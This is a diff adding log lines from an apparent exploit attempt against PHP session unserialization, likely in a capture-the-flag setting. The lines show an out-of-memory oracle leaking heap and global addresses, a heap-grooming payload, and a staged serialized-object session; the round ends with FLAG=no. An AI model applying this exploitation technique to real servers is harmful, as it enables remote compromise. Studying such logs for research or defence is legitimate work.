@@ -21,3 +21,13 @@
 [2026-10-21 23:33:19] staged consumer session sess_b233319bbbbbbbbbbbbbbbbbbbbbbbbb: poc|O:9:Exception:0:{}
 [2026-10-21 23:33:19] consumer: t=0.2s len=6 FLAG=no
 [2026-10-21 23:33:19] consumer body:  <EOF>
+[2026-10-22 00:20:30] === round r4: cpid=2939079 bias=0xfa2f10be0000 basic_globals=0xfa2f11afe748
+[2026-10-22 00:20:30] baseline read: 6 children [53, 54, 56, 57, 69, 499]
+[2026-10-22 00:20:30] staged producer session sess_a002030aaaaaaaaaaaaaaaaaaaaaaaaa (72MB) + consumer sid ready
+[2026-10-22 00:20:31] producer: t=0.1s oom_signature=True len=553
+[2026-10-22 00:20:31] producer body: <br /> <b>Fatal error</b>:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 72000032 bytes) in <b>Unknown</b> on line <b>0</b><br /> <br /> <b>Warning</b>:  PHP Request Startup: Fa
+[2026-10-22 00:20:31] ORACLE: child=69 &BG(unserialize).data=0xfa2f11afea78 d_chunk=0xfa2f0ea6a000
+[2026-10-22 00:20:31] groom payload built: 8192B, LG=0xfa2f0ea6b000
+[2026-10-22 00:20:31] staged consumer session sess_b002030bbbbbbbbbbbbbbbbbbbbbbbbb: poc|O:9:Exception:0:{}
+[2026-10-22 00:20:31] consumer: t=0.3s len=6 FLAG=no
+[2026-10-22 00:20:31] consumer body:  <EOF>
